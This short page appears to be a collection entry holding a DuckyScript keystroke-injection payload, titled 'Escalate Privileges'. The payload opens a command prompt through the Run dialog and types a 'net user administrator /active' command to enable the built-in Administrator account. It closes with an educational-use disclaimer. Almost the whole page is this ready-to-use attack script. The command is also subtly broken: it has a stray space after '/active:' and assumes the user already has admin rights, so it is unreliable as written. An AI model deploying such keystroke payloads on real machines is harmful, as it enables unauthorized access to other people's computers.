# Escalate Privileges

Attempt to escalate privileges to Administrator level by using a common command.

```
DELAY 500
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING net user administrator /active: yes
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.